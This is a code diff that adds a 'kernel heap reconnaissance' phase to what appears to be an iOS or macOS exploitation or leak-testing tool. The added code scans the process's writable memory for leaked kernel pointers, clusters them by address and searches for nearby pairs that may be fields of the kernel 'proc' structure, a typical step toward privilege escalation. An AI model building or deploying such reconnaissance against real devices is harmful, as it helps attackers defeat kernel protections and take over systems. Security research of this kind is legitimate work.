@@ -587,6 +587,110 @@ static BOOL isKernelPointer(uint64_t v) {
         break;
     }
 
+    // --- Phase 10: kernel heap reconnaissance ---
+    // Map all kernel pointers, cluster by address range, analyze structure.
+    [report appendString:@"\n--- Phase 10: kernel heap reconnaissance ---\n"];
+
+    scanAddr = 0; scanSize = 0;
+    uint64_t kptrs[512] = {0};
+    size_t kptrAddrs[512] = {0};
+    int nkptrs = 0;
+
+    while (1) {
+        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
+        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
+        uint32_t d10 = 0;
+        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d10,
+                                   (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
+        if (scanInfo.is_submap) continue;
+        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
+        if (scanSize > 16 * 1024 * 1024) continue;
+
+        volatile uint64_t *rp = (volatile uint64_t *)scanAddr;
+        size_t words = scanSize / 8;
+
+        for (size_t i = 0; i < words && nkptrs < 512; i++) {
+            uint64_t v = rp[i];
+            if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;
+            if ((v & 0xfff) == 0xfff) continue;
+            kptrs[nkptrs] = v;
+            kptrAddrs[nkptrs] = i * 8;
+            nkptrs++;
+        }
+    }
+
+    [report appendFormat:@"total kernel pointers collected: %d\n", nkptrs];
+
+    // Cluster by kernel address range (256KB buckets)
+    #define MAX_CLUSTERS 64
+    uint64_t clusterBase[MAX_CLUSTERS] = {0};
+    int clusterCount[MAX_CLUSTERS] = {0};
+    int nclusters = 0;
+
+    for (int i = 0; i < nkptrs; i++) {
+        uint64_t bucket = kptrs[i] & ~0x3ffffULL; // 256KB alignment
+        BOOL found = NO;
+        for (int c = 0; c < nclusters; c++) {
+            if (clusterBase[c] == bucket) {
+                clusterCount[c]++;
+                found = YES;
+                break;
+            }
+        }
+        if (!found && nclusters < MAX_CLUSTERS) {
+            clusterBase[nclusters] = bucket;
+            clusterCount[nclusters] = 1;
+            nclusters++;
+        }
+    }
+
+    // Sort by count
+    for (int i = 0; i < nclusters - 1; i++) {
+        for (int j = 0; j < nclusters - i - 1; j++) {
+            if (clusterCount[j] < clusterCount[j + 1]) {
+                uint64_t tb = clusterBase[j]; int tc = clusterCount[j];
+                clusterBase[j] = clusterBase[j + 1]; clusterCount[j] = clusterCount[j + 1];
+                clusterBase[j + 1] = tb; clusterCount[j + 1] = tc;
+            }
+        }
+    }
+
+    [report appendFormat:@"kernel heap clusters (256KB buckets): %d\n", nclusters];
+    for (int c = 0; c < nclusters && c < 15; c++) {
+        [report appendFormat:@"  cluster 0x%llx: %d ptrs\n", clusterBase[c], clusterCount[c]];
+    }
+
+    // For top 3 clusters, show representative pointers
+    for (int c = 0; c < 3 && c < nclusters; c++) {
+        [report appendFormat:@"\ncluster 0x%llx pointers:\n", clusterBase[c]];
+        int shown = 0;
+        for (int i = 0; i < nkptrs && shown < 8; i++) {
+            if ((kptrs[i] & ~0x3ffffULL) == clusterBase[c]) {
+                [report appendFormat:@"  [user+0x%zx] -> kernel 0x%llx\n", kptrAddrs[i], kptrs[i]);
+                shown++;
+            }
+        }
+    }
+
+    // Check for proc-like patterns: look for kernel pointers close to each other
+    // (within 0x400 bytes in kernel heap) that could be proc fields
+    [report appendString:@"\n--- proc field proximity analysis ---\n"];
+    int procCandidates = 0;
+    for (int i = 0; i < nkptrs && procCandidates < 5; i++) {
+        for (int j = i + 1; j < nkptrs; j++) {
+            uint64_t diff = (kptrs[i] > kptrs[j]) ? kptrs[i] - kptrs[j] : kptrs[j] - kptrs[i];
+            if (diff > 0 && diff < 0x400) {
+                // Two kernel pointers within 0x400 bytes — possible struct fields
+                uint64_t lo = (kptrs[i] < kptrs[j]) ? kptrs[i] : kptrs[j];
+                [report appendFormat:@"pair: 0x%llx and 0x%llx (gap=0x%llx) -> possible struct at 0x%llx\n",
+                 kptrs[i], kptrs[j], diff, lo];
+                procCandidates++;
+                if (procCandidates >= 5) break;
+            }
+        }
+    }
+    [report appendFormat:@"close pairs found: %d\n", procCandidates];
+
     // --- Verdict ---
     [report appendString:@"\n"];
     if (kptrCount > 0) {
